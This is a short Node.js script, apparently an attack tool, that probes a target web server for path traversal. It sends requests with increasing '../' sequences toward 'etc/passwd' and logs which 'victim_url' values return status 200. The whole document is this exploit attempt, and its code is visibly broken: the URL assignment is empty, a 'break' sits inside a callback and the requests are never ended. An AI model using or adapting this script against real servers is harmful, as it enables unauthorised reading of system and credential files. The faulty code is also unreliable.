const http = require('http');
const { response } = require('express');

const url = ;
const payload = "../";
const i = 0;
let success_url = [];

for (let i = 0; i < 10; i++) {
    let victim_url = url + payload.repeat(i + 1) + "etc/passwd";
    http.request(victim_url, (response) => {
    const status = response.statusCode;

    console.log(status);

    if(status == 200){
        success_url.push(victim_url);
        break;
    }

    console.log(success_url);
    
    })
}
console.log(success_url);